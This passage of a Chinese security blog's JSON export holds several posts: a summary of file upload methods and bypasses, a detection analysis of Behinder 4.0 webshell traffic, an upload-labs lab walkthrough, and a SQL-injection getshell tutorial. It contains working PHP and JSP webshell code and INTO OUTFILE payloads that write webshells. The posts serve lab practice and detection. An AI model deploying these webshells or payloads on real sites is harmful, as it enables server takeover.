参考文章https://www.freebuf.com/sectool/259855.html","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"内网渗透","slug":"渗透测试/内网渗透","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"http隧道","slug":"http隧道","permalink":"https://gryffinbit.top/tags/http%E9%9A%A7%E9%81%93/"}],"author":"Gryffinbit"},{"title":"web文件上传方式总结","slug":"web文件上传方式总结","date":"2022-09-20T10:50:51.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/09/20/web文件上传方式总结/","permalink":"https://gryffinbit.top/2022/09/20/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/","excerpt":"","text":"前言upload-labs 文件上传靶场通过，跳转Blog ：https://gryffinbit.top/2022/09/16/upload-labs%E9%9D%B6%E5%9C%BA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/ Web文件上传方法总结表单上传这是传统的form表单上传，使用form表单的input[type=”file”]控件，可以打开系统的文件选择对话框，从而达到选择文件并上传的目的，它的好处是多浏览器兼容，它是web开发者最常用的一种文件上传方式。 表单的代码如下： 12345&lt;form method=&quot;post&quot; action=&quot;http://uploadUrl&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input name=&quot;file&quot; type=&quot;file&quot; accept=&quot;image/gif,image.jpg&quot; /&gt; &lt;input name=&quot;token&quot; type=&quot;hidden&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;&lt;/form&gt; 以下是表单上传几个关键点： method=”post”： 采用post方式提交数据 enctype=”multipart/form- data”：采用multipart格式上传文件，此时request头会显示 Content-Type:multipart/form-data; boundary=—-WebKitFormBoundaryzr34cwJ67R95KQC9 action：标明上传的服务端处理地址 type=”file”：使用input的file控件上传 如果是多文件批量上传，可以将input[type=”file”]的name属性设置为如：name=”file[]” accept属性是HTML5的新属性，它规定了可通过文件上传提交的文件类型 上传的触发事件可以是：input[type=”file”]的onChange触发，也可以由一个独立的按钮的onClick使整个表单提交，此时还可以用input[type&#x3D;”hidden”]带一些其它的参数，比如Token来源验证等等。 Ajax 无刷新上传Ajax无刷新上传的方式，本质上与表单上传无异，只是把表单里的内容提出来采用ajax提交，并且由前端决定请求结果回传后的展示结果，不用像直接表单上传那样刷新和跳转页面。 html代码片段如下： 1234&lt;form&gt; &lt;input id=&quot;file&quot; name=&quot;file&quot; type=&quot;file&quot; /&gt; &lt;input id=&quot;token&quot; name=&quot;token&quot; type=&quot;hidden&quot; /&gt;&lt;/form&gt; javascript代码片段如下： 123456789101112131415$(&quot;#file&quot;).on(&quot;change&quot;, function()&#123; var formData = new FormData(); formData.append(&quot;file&quot;, $(&quot;#file&quot;)[0].files); formData.append(&quot;token&quot;, $(&quot;#token&quot;).val()); $.ajax(&#123; url: &quot;http://uploadUrl&quot;, type: &quot;POST&quot;, data: formData, processData: false, contentType: false, success: function(response)&#123; // 根据返回结果指定界面操作 &#125; &#125;);&#125;); 使用file控件的change来触发上传事件，当然也可以使用某个按钮来触发表单提交。提交数据时，用到了FormData对象来发送二进制文件，FormData构造函数提供的append()方法，除了直接添加二进制文件还可以附带一些其它的参数， 作为XMLHttpRequest实例的参数提交给服务端。 使用jQuery提供的ajax方法来发送二进制文件，还需要附加两个参数： processData: false &#x2F;&#x2F; 不要对data参数进行序列化处理，默认为true contentType: false &#x2F;&#x2F; 不要设置Content-Type请求头，因为文件数据是以 multipart&#x2F;form-data 来编码 截图粘贴上传截图粘贴上传的核心思想是，监听粘贴事件，然后获取剪切板中的数据，如果是一张图片，则触发上传事件。系统剪切版的数据在不同浏览器保存在不同的位置 IE内核：windows.clipboardData 其它：e.originalEvent.clipboardData 1234567891011121314151617181920212223$(&quot;textarea&quot;).on(&quot;paste&quot;, function(e)&#123; e.stopPropagation(); var self = this; var clipboardData = e.originalEvent.clipboardData; if (clipboardData.items.length &lt;= 0) &#123; return; &#125; var file = clipboardData.items[0].getAsFile(); if (!file) &#123; return; &#125; var formData = new FormData(); formData.append(&quot;file&quot;, file); formData.append(&quot;token&quot;, $(&quot;#token&quot;).val()); $.ajax(&#123; url: &quot;http://uploadUrl&quot;, type: &quot;POST&quot;, data: formData, &#125;).done(function(response) &#123; // 根据返回结果指定界面操作 &#125;); e.preventDefault();&#125;); 拖拽上传拖拽上传的方式，支持的浏览器比较少，因为它用到了HTML5的两个新的属性（API）一个是Drag and Drop,一个是File API。 上传域监听拖拽的三个事件：dragEnter、dragOver和drop，分别对应拖拽至、拖拽时和释放三个操作的处理机制，当然你也可以监听dragLeave事件。 HTML5的File API提供了一个FileList的接口，它可以通过拖拽事件的e.dataTransfer.files来传递的文件信息，获取本地文件列表信息。 File API在HTML5规范中只是草案，在 W3C 草案中，File 对象只包含文件名、文件类型和文件大小等只读属性。但部分浏览器在草案之外提供了一个名为 FileReader 的对象，用以读取文件内容，并且可以监控读取状态，它提供的方法有： “readAsBinaryString” ，”readAsDataURL” ，”readAsText” ，”abort” 等。 1234567891011121314151617181920212223242526272829// dragenter$(&quot;#textarea&quot;).on(&quot;dragenter&quot;, function(e)&#123; e.preventDefault();&#125;);// dragover$(&quot;#textarea&quot;).on(&quot;dragover&quot;, function(e)&#123; e.preventDefault();&#125;);// drop$(&quot;#textarea&quot;).on(&quot;drop&quot;, function(e)&#123; e.stopPropagation(); e.preventDefault(); var files = e.originalEvent.dataTransfer.files; _.each(files, function(file) &#123; if (!/^image*/.test(file.type)) &#123; return; &#125; var fileReader = new FileReader(); fileReader.onload = function() &#123; //uploadFile(file); &#125;; fileReader.readAsDataURL(file); &#125;);&#125;); 拖拽上传过程中的几个关键点： 在drop事件触发后通过e.dataTransfer.files获取拖拽文件列表，在jQuery中是e.originalEvent.dataTransfer.files 拖拽上传仅支持图片，文件对象中file.type标识了文件类型。 由于可能是多图拖拽，所以可以遍历图片上传，这里用了Underscore的each方法。 这里用readAsDataURL读取文件内容为二进制文件，你还可以将其转换为Base64方式上传，只是http协议里面存在对非二进制数据的上传大小限制为2M。 上传的过程跟前面的方式相同，即：创建FormData对象并发起Ajax请求。 拍照上传拍照上传可以是PC上的摄像头拍照上传也可以是手机等移动设备的拍照上传。 上传文件时必须做好文件的安全性，除了前端必要的验证，如文件类型、后缀、大小等验证，重要的还是要在后台做安全策略。 这里我列举几个注意点： 后台需要进行文件类型、大小、来源等验证 定义一个.htaccess文件，只允许访问指定扩展名的文件。 将上传后的文件生成一个随机的文件名，并且加上此前生成的文件扩展名。 设置上传目录执行权限，避免不怀好意的人绕过如图片扩展名进行恶意攻击，拒绝脚本执行的可能性。 Web文件上传绕过形式判断方法 上传点 上传头像 上传相册 上传附件 添加文章图片 前台留言资料上传 编辑器文件上传 后缀绕过 PHP Php2, php3, php5, phtml, pht asp Asa, cer, cdx Aspx ascx, ashx, asac jsp jsp, jspx, jspf 绕过类型 Content-Type绕过 前端绕过 文件解析规则绕过 Windows环境特性绕过 文件名大小写绕过 双写绕过 点空格绕过 文件头绕过 条件竞争绕过","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"文件上传","slug":"Web安全/文件上传","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"Gryffinbit"},{"title":"冰蝎4.0特征分析及流量检测思路","slug":"冰蝎4-0特征分析及流量检测方案","date":"2022-09-20T09:47:45.000Z","updated":"2024-11-12T07:00:21.000Z","comments":true,"path":"2022/09/20/冰蝎4-0特征分析及流量检测方案/","permalink":"https://gryffinbit.top/2022/09/20/%E5%86%B0%E8%9D%8E4-0%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90%E5%8F%8A%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88/","excerpt":"","text":"冰蝎4.0特征分析及流量检测思路冰蝎4.0的介绍简介冰蝎是一款基于Java开发的动态加密通信流量的新型Webshell客户端。老牌 Webshell 管理神器——中国菜刀的攻击流量特征明显，容易被各类安全设备检测，实际场景中越来越少使用，加密 Webshell 正变得日趋流行。 由于通信流量被加密，传统的 WAF、IDS 设备难以检测，给威胁狩猎带来较大挑战。冰蝎其最大特点就是对交互流量进行对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。 新版本修复问题： 修复了在zimbra环境下的兼容性问题； 修复了在exchange环境下的兼容性问题； 修复了Linux环境下打开文件失败的问题； 修复了命令执行中输入反斜杠导致后续无法输入新命令的问题； 修复了列目录时目录跳动的问题； 修复JDK18+执行命令乱码的问题； 修复内网穿透模块的几个影响隧道稳定性的几个问题； 修复了代码编辑框的复制粘贴问题； 其他一些优化； 新增功能： 新增支持多线程超大文件上传、下载； 新增文件打包压缩； 新增数据库连接配置可保存； 取消硬编码通信协议，传输协议完全自定义，并支持即时在线校验测试。 新增平行世界模块，可对目标内网资产进行管理； 新增主机扫描、端口扫描、服务识别模块； 新增支持Java9~java15+版本Agent内存马一键注入； 新增支持Java Agent无文件落地注入内存马； 新增多层网络子Shell穿透模块，实现多层”蝎中蝎”； 新增离线模式，自动缓存数据，如shell丢失，可离线查看已缓存内容； 开放插件开发模块，可开发自定义插件，内置多款插件； 支持二进制服务端，服务端不再依赖web。 工具通信原理冰蝎的通信过程可以分为两个阶段： 密钥协商 加密传输 1. 第一阶段-密钥协商 1）攻击者通过 GET 或者 POST 方法，形如 http://127.0.0.1/shell.aspx?pass=645 的请求服务器密钥； 2）服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 $_SESSION 变量中，并返回密钥给攻击者。 2. 第二阶段-加密传输 1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端； 2）服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令； 3）执行结果通过AES加密后返回给攻击者。 特征检测Accept字段流量特征 1Accept: application/json, text/javascript, */*; q=0.01 检测思路 浏览器可接受任何文件，但最倾向application&#x2F;json和 text&#x2F;javascript 规则 file_data的作用和http_server_body差不多，都是使content匹配response body中的内容，唯一不同的是使用了file_data关键字的规则，其在file_data之后的content都会受到它的影响。file_data之后的content都必须在response body里匹配。 Content-Type流量特征 1Content-type: Application/x-www-form-urlencoded 检测思路 可以把这个字段作为一个弱特征，辅助其他特征来检测 User-agent 字段流量特征 冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。 ![image-20220729155845862](&#x2F;Users&#x2F;gryffinbit&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220729155845862.png) 检测思路 在较短较简单的content字段后加上fast_pattern关键字则会优先匹配这个content。避免浪费太长时间在匹配user-agent上 snort编写可以用content：“User-Agent”； content：“浏览器版本”。来匹配相应的十个浏览器 端口流量特征 冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加 检测思路 可以对符合该范围内的端口告警 PHP webshell 中存在固定代码流量特征 12$post=Decrypt(file_get_contents(&quot;php://input&quot;));eval($post); 检测思路 content字段中，将eval($post)作为流量特征纳入 长连接流量特征 冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection。 Connection: Keep-Alive 检测思路 可以作为辅助的流量特征 固定的请求头和响应头流量特征 请求字节头： 1dFAXQV1LORcHRQtLRlwMAhwFTAg/M 响应字节头： 1TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd 解密报文 通过webshell脚本，逆向分析揭秘算法 ![image-20220919140750983](&#x2F;Users&#x2F;gryffinbit&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220919140750983.png) 1234567891011121314&lt;?phpfunction decrypt($data)&#123; $key=&quot;e45e329feb5d925b&quot;; $bs=&quot;base64_&quot;.&quot;decode&quot;; $after=$bs($data.&quot;&quot;); for($i=0;$i&lt;strlen($after);$i++) &#123; $after[$i] = $after[$i]^$key[$i+1&amp;15]; &#125; echo $after; return $after;&#125;$data=&quot;TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd9eghDQVwxLhN6M2NDdiAjfXo2B0BcAwQKejN3Rh4DPEZMIV5eSyIJC0QgVVhXASt3XCFfWFsACw9aMFVHWj5KWFwvVV5TUQMPWC8BVXg3IAZ4DAJxdBwBJXE1Vnx2CydyeglLRVguJzZRLG9ZUDQdZWYjcWddPjcUVglVWlckHWxjVFBVDFMUJwBRTEcAAFdicTRcfHoMLBV4DnBEeCYGQngPUFVwIiBTeg5oSHwhJFN8IUt3ajAsSXwneFV8ISRTfCZyVXAlUSx2DnBFeAgsQnghUER0DAYFfCB8A3oINE58JnJVcCIdJ2YycBl8ISRTfCZyVXAlJAV8Jw1HcTMKTXghdgF1HCQYeR5wBnwhJEx7D1wDdjUkBXwneFV8ISRTfCZyVXAlJAV8J3hLeiEnRFcIYV5cJVAVVCx4fHYILEN4MVBEdCI0FHgOeFV8JiAGeg9iB3AlJAV8J3hVfCEkU3wmclV0DCAReDBaA3wlEkFWIltFfTcKG3ggfEh5GCQFeR9yB3AlJBt4IFYDewskU3wmclVwJSQFfCd4VXwhJFN8JnJLdB8nFVQse0JXDz9CeQtxXVonVSl4DnhLeAtdQ3scC0t3DyQFeDBeBHgIMFN8JnJVaSM3KGAODVV8ISRTfCZyVXAlJAVWI1FFYToJdm8iAkJbAVUpeA54S3gLXUN7HAtLdx8kBXgwbAR7JgJTfCZyVXAlJAV8J3hVfCEkU3wmckh0MiwFVlZRXlclEkFWIltFfTcKBXwneFV8ISRTfCZyVXAlJAV8J3gCfC02AEQQUmVRTTZVQQ14VXwhJFN8JnJVcCIsGnkgbEh6ISFYRz9VXVAJLCx2DXhVfCEkU3wmclVwJSQFfCd4VXwmKFMAKVpDDFMQFwAGC2R8JiBNeSFyRXYlEhV6IHRBeyYwBnwqZGJLTQA3RCtuRllJDH9SAgN5Gxs=&quot;;decrypt($data);?&gt; 得到报文内容 1&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;IOmpseWKqOWZqCBFIOS4reeahOWNt+aYryDmlrDliqDljbcNCiDljbfnmoTluo\\/liJflj7fmmK8gMUE2Mi1CMzdGDQoNCiBFOlxwaHBTdHVkeVxQSFBUdXRvcmlhbFxXV1cg55qE55uu5b2VDQoNCjIwMjIvMDcvMjcgIDE1OjQzICAgIDxESVI+ICAgICAgICAgIC4NCjIwMjIvMDcvMjcgIDE1OjQzICAgIDxESVI+ICAgICAgICAgIC4uDQoyMDE3LzAzLzI4ICAxNjo1OSAgICAgICAgICAgICAgICAyOCBpbmRleC5waHANCjIwMTcvMDQvMjAgIDE2OjQ5ICAgICAgICAgICAgMjEsMTc1IGwucGhwDQoyMDEzLzA1LzA5ICAyMDo1NiAgICAgICAgICAgICAgICAyMyBwaHBpbmZvLnBocA0KMjAyMi8wNy8yNiAgMTg6MjUgICAgPERJUj4gICAgICAgICAgcGhwTXlBZG1pbg0KMjAyMi8wNy8yNyAgMTU6NDggICAgICAgICAgICAgICAzMTIgc2hlbGwucGhwDQogICAgICAgICAgICAgICA0IOS4quaWh+S7tiAgICAgICAgIDIxLDUzOCDlrZfoioINCiAgICAgICAgICAgICAgIDMg5Liq55uu5b2VIDEyLDAwOCwwODMsNDU2IOWPr+eUqOWtl+iKgg0K&quot;&#125; 将报文base64解密得到 12345678910111213141516&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot; 驱动器 E 中的卷是 新加卷 卷的序列号是 1A62-B37F E:\\phpStudy\\PHPTutorial\\WWW 的目录2022/07/27 15:43 &lt;DIR&gt; .2022/07/27 15:43 &lt;DIR&gt; ..2017/03/28 16:59 28 index.php2017/04/20 16:49 21,175 l.php2013/05/09 20:56 23 phpinfo.php2022/07/26 18:25 &lt;DIR&gt; phpMyAdmin2022/07/27 15:48 312 shell.php 4 个文件 21,538 字节 3 个目录 12,008,083,456 可用字节&quot;&#125; 可以获取到目录信息 连接密码流量特征： 默认时，所有冰蝎4.0 webshell都有“e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond webshell特征JSP webshell代码特征 1234567891011121314&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt; &lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] buf = new byte[512]; int length=request.getInputStream().read(buf); while (length&gt;0) &#123; byte[] data= Arrays.copyOfRange(buf,0,length); bos.write(data); length=request.getInputStream().read(buf); &#125; new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);&#125; %&gt; PHP webshell代码特征 123@error_reporting(0);$post=Decrypt(file_get_contents(&quot;php://input&quot;));eval($post); 请求和响应请求头：dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M 解密后：@error_reporting(0);\\r 响应头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd 解密后：{“status”:”c3VjY2Vzcw&#x3D;&#x3D;”,”msg”:” 其中”c3VjY2Vzcw&#x3D;&#x3D;”经过base64解密后的内容为success 冰蝎连接时不用输入密码，根据对冰蝎的使用分析，冰蝎4.0可以在初始时自定义连接密码 要设置自定义密码，需要在本地和远程加解密函数中都保存$key 这样的话，如果对方更换密码，初始字符串经过密钥加密，那么它的请求头和响应头都会发生变化，这就需要针对webshell中的$key动态改变解密函数才能的到解密后固定的请求头和响应头 另外，每次发起连接时都会发出两次http请求，默认连接密钥下，所有响应头都相同，第二次请求头比较特殊，初次之外，所有的请求头都相同。 第一次请求解密 1dFAXQV1LORcHRQtLRlwMAhwFTAg/M @error_reporting(0);\\r 第二次请求解密 1OT8AQUBWFDoQUBRWQEELC1MdVRoJNGwDF1sHTVtaDEVZVAxdGh0RDQNBAU9X error_reporting(0);\\r 参考文章https://cloud.tencent.com/developer/article/1621021","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"流量分析","slug":"Web安全/流量分析","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"冰蝎4.0","slug":"冰蝎4-0","permalink":"https://gryffinbit.top/tags/%E5%86%B0%E8%9D%8E4-0/"}],"author":"Gryffinbit"},{"title":"upload-labs靶场文件上传","slug":"upload-labs靶场文件上传","date":"2022-09-16T16:16:29.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/09/17/upload-labs靶场文件上传/","permalink":"https://gryffinbit.top/2022/09/17/upload-labs%E9%9D%B6%E5%9C%BA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","excerpt":"","text":"前言Web文件上传方法总结，跳转Blog：https://gryffinbit.top/2022/09/20/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/ 实验环境docker hub靶场：https://hub.docker.com/r/c0ny1/upload-labs 腾讯云：Ubuntu Server 20.04 LTS 64bit 靶场搭建下载 12wget -c &quot;https://github.com/c0ny1/upload-labs/archive/refs/heads/master.zip&quot;unzip master.zip 创建镜像 12cd upload-labs/dockerdocker build -t upload-labs . 创建容器 1docker run -d -p 80:80 upload-labs:latest Pass-01知识点解析思路: 前端JS绕过： 判断是否存在js绕过漏洞： 打开调试面板，选择网络，然后上传图片文件和非图片文件，然后对这两个文件的变化进行对比，如果网络中没有数据变化，说明存在js前端验证漏洞，如果有变化说明不存在。(有变化说明，前端没有做验证，是把文件传输到后台，在后台进行验证的，所以才会有网络请求。) 绕过方式-删除或禁用js： 在输入框中输入about:config点击接受 在搜索框中输入javascript然后找到javascript.enabled选项双击，出现false: 可以上传了 绕过方式-使用代理上传文件（burpsuite、冰蝎、蚁剑等） 抓取数据包，修改filename里面的文件格式，再forward发包 攻略检查是否存在前端JS绕过上传png，可以成功上传 上传php，提示失败，但网络并没有发起请求 所以存在js前端绕过漏洞 绕过 禁用js的方式 禁用js 上传成功 采用burpsuite改包的方式 把test.php后缀改为jpg 1&lt;?php @eval($_REQUEST[&#x27;666&#x27;]); ?&gt; 开启burpsuite，浏览选择test.jpg，先不要点点击，开启bp的抓包功能 修改抓取到的数据包，改成php的后缀 上传成功 在服务器上查看是否有该文件 因为是用docker搭的环境，需要进入到docker的命令行中查看。 1docker exec -it a47af352776f /bin/bash 1ls 上传成功 访问 关于docker文件映射的一个关系。docker启动的时候，开启了apache服务 。所以访问http://ip:80的时候，就是访问了apache的默认根目录`/var/www/html`下的文件，所以去访问上传的文件，需要访问`http://ip:80/upload/readme.php` （即在docker中的路径关系，默认&#x2F;var&#x2F;www&#x2F;html为根目录） 蚁剑外链 上传了ant.php，通过蚁剑去链接。 1&lt;?php eval($_POST[&#x27;ant&#x27;]); ?&gt; ​ Pass-02知识点解析 攻略 判断是否为前端JS绕过 上传非图片和图片文件后，网络请求发生了改变。说明处理的时候将图片发往后端进行了判断。排除是前端JS绕过 排除一些白名单绕过的方式 另外通过源码的判断，PHP使用$_FILES实现上传，不存在00截断绕过上传限制问题。 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;文件类型不正确，请重新上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 判断php的版本 可以通过pass-01，上传木马，获取php版本 1&lt;?php eval(@$_POST[&#x27;a&#x27;]); ?&gt; Post注入 ​ 参考文章https://cloud.tencent.com/developer/article/1679294 《从0到1 CTFer成长之路》（P121 web文件上传漏洞） 思路2: 00截断绕过上传限制： 00截断是绕过上传限制的常见方法，在C语言中，\\0是字符串的结束符，如果用户能够传入\\0，就能实现截断。 00截断绕过上传限制适用的场景：后端先获取用户上传文件的文件名，如x.php\\00.jpg，再根据文件名获得文件的实际后缀jpg；通过后缀的白名单校验后，最终在保存文件时发生截断，实现上传的文件为x.php PHP的底层代码为C语言，自然存在这种问题，但实际PHP使用$_FILES实现文件上传时并不存在00截断绕过上传限制问题，因为PHP在注册$_FILES全局变量时已经产生了截断。上传文件名为x.php\\00.jpg的文件，而注册到$_FILES[&#39;name&#39;]的变量值为x.php，根据该值得到的后缀为php，因此无法通过后缀的白名单校验。 版本限制：在jdk7u40以下版本存在00截断问题，7u40以后的版本，在上传、写入文件等操作中都会调用File的isInvaild()方法判断文件是否合法，即不允许文件名含有\\0。如果文件不合法，将抛出异常退出流程。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"文件上传","slug":"Web安全/文件上传","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://gryffinbit.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}],"author":"Gryffinbit"},{"title":"sql注入getshell","slug":"sql注入getshell","date":"2022-09-09T09:58:05.000Z","updated":"2024-11-12T06:59:15.000Z","comments":true,"path":"2022/09/09/sql注入getshell/","permalink":"https://gryffinbit.top/2022/09/09/sql%E6%B3%A8%E5%85%A5getshell/","excerpt":"","text":"前言在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个 into dumpfile() into outfile() load_file() 读写文件函数调用的限制。 into outfile select into outfile 的方法是只能将文件生成在服务器上，而不能生成在客户端上。可以使用 mysql -e &quot;select&quot; &gt; /tmp/file 这种重定向的方法，将文件生成在客户端上。 用法：网站数据库为mysql，在sql注入的过程中如果爆出了网站的绝对路径，常规思路会去查看一下mysql中用户权限是否有读写权限。有的话可以对特定目录进行写入shell。 1mysql&gt; select &lt;shell&gt; into outfile &#x27;/tmp/test.php&#x27; 有时会写入失败，是因为启动mysql的时候使用了--secure-file-priv 参数。这个参数的主要目的就是限制 load data infile 或者select into outfile 之类文件的目录位置。 使用 SELECT @@global.secure_file_priv; 查看当前设置的路径，默认为 /var/lib/mysql-files 可以把这个选项关掉，继续测试outfile写入文件权限的问题。在 /etc/mysql/my.cnf 中如下配置，然后重新启动mysql服务 12[mysqld]secure-file-priv = &quot;&quot; load_file从外部将数据导入到mysql服务器。 load data infile ，则load的文件必须位于mysql服务器上。 load data local infile ，则load的文件必须在客户端上，该语句将从客户端将文件读取并发送到服务器上。 利用outfile getshellselect &quot;contens&quot; into outfile &quot;filename&quot; 满足条件 没有运行在 secure-file-priv模式下 对web目录具有读写权限 没有被过滤单双引号 知道web的物理绝对路径 secure-file-priv secure_file_priv 可以设置三个参数：空，NULL，filepath 参数说明： 空值：设置为空时，没有进行安全配置，那么这模式下应该就可以导出 webshell NULL：设置本参数值时，数据库不能进行导入导出 filepath：filepath 是导入导出的文件路径，设置这个值，那么只能导出文件到 filepath 的路径。 所以需要满足 secure_file_priv 为空或者为 web 路径才可以进行读写操作 可以在 /etc/mysql/my.cnf配置文件中修改secure-file-priv = &quot;&quot; （不过都有权限修改配置文件了，还需要这么费劲写木马吗。。） 1select &quot;&lt;?php eval($_POST[&#x27;a2u13&#x27;]);?&gt;&quot; INTO OUTFILE &quot;/Application/MAMP/htdocs/mysql_shell.php&quot; sql-lab实操 注入点判断 1?id=1’)) - - 时间盲注测试 1?id=3&#x27;)) and sleep(5) --+ 会延时，所以注入点为 1&#39;)) Order by 判断列数 1?id=1&#x27;)) order by 3 --+ 当order by 4 的时候会报错，所以列数为3 在此之前需要知道网站的目录情况 利用sql-lab less2 拿到绝对路径 1http://localhost:8888/Less-2/?id=-1%20union%20select%201,@@basedir,@@datadir%20--+ 1/var/lib/mysql/ 可以根据路径判断操作系统为Linux，在Linux下默认的网站路径为/var/www/html。SQLI-LABS Less-7靶场的路径为/var/www/sqlilabs/Less-7） 所以oufile文件路径为 1/var/www/sqlilabs/Less-7/test.php 上传测试一下 1?id=1&#x27;)) union select 1,2,database() into outfile &#x27;/var/www/Less-7/1.txt&#x27; --+ 节选：👇 由于版本原因鄙人使用的是5.7.19-0ubuntu0.16.04.1高版本，官方加了安全策略，这里我们需要更改/etc/mysql/mysql.conf.d/mysqld.cnf在末尾处添加secure_file_priv=&quot;/&quot;,更改后service mysql restart重启mysql服务。之后我们从mysql命令行来看策略： 1mysql&gt;show variables like &#x27;%secure%&#x27;; 复制 我们看到secure_file_priv这里已经变成“&#x2F;”，此时我们可以写入。 1/sqli-labs/Less-7/?id=1?id=-1&#x27;)) union select 1,0x3c3f706870206563686f2027636c65616e726f626f74404368616d6435272e706870696e666f28293b203f3e,3 into outfile &quot;/var/www/html/sqli-labs/Less-7/test.php&quot; -- - //这里我们写入到目录 复制 我们来访问刚写入的地方 1/sqli-labs/Less-7/?id=1?id=-1&#x27;)) union select 1,0x3c3f706870206563686f2027636c65616e726f626f74404368616d6435272e706870696e666f28293b203f3e,3 into outfile &quot;/var/www/html/sqli-labs/Less-7/test.php&quot; -- - 复制 这里解释下0x3c3f706870206563686f2027636c65616e726f626f74404368616d6435272e706870696e666f28293b203f3e，这是对语句进行hex编码，为了防止单引号冲突，而导致写入文件失败。 参考文章https://blog.csdn.net/bnxf00000/article/details/64123549 https://www.jianshu.com/p/bcafd8f3ad8e Mysql的getshell与提权总结【使用 log 写入 Shell】 https://www.freebuf.com/articles/web/334078.html https://www.freebuf.com/vuls/334032.html https://cloud.tencent.com/developer/article/1078125 https://www.freebuf.com/articles/web/274059.html","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"sql","slug":"Web安全/sql","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://gryffinbit.top/tags/sql/"}],"author":"Gryffinbit"},{"title":"Log4j2复现","slug":"Log4j2复现","date":"2022-09-01T16:04:03.000Z","updated":"2024-11-12T06:59:29.000Z","comments":true,"path":"2022/09/02/Log4j2复现/","permalink":"https://gryffinbit.top/2022/09/02/Log4j2%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"漏洞文档漏洞描述Apache Log4j2 是一款开源的 Java 